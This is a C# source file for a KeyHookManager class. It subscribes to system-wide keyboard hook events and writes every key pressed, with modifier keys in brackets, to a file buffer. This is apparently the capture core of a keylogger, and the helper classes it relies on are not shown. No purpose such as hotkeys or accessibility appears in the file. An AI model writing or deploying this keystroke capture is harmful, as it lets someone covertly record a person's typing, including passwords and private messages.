using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace KeyHook
{
    public class KeyHookManager
    {
        #region Memebers

        private GlobalKeyboardHook gkh = null;
        private BufferManager bufferManager = null;

        #endregion

        #region Constructors

        public KeyHookManager()
        {
            //Initialize the memebers
            gkh = new GlobalKeyboardHook();
            bufferManager = new BufferManager();
        }

        #endregion

        #region Public Methods

        public void Start()
        {
            if (gkh != null)
            {
                gkh.KeyDown += new KeyEventHandler(gkh_KeyDown);
                gkh.KeyUp += new KeyEventHandler(gkh_KeyUp);
            }
            if (bufferManager!= null)
                bufferManager.Start();
        }

        public void Stop()
        {
            if (gkh != null)
            {
                gkh.KeyDown -= new KeyEventHandler(gkh_KeyDown);
                gkh.KeyUp -= new KeyEventHandler(gkh_KeyUp);
            }
            if (bufferManager != null)
                bufferManager.Stop();
        }

        #endregion

        #region Global Key hook Events

        void gkh_KeyUp(object sender, KeyEventArgs e)
        {
            FileBuffer buffer = FileBuffer.GetInstance();
            if (GlobalKeyboardHook.IsModifier((int)e.KeyCode))
                buffer.Write("[" + e.KeyCode.ToString() + "]");
            else
                buffer.Write(e.KeyCode.ToString());
            //e.Handled = true;
        }

        void gkh_KeyDown(object sender, KeyEventArgs e)
        {
            //Do something
            //e.Handled = true;
        }

        #endregion

    }
}
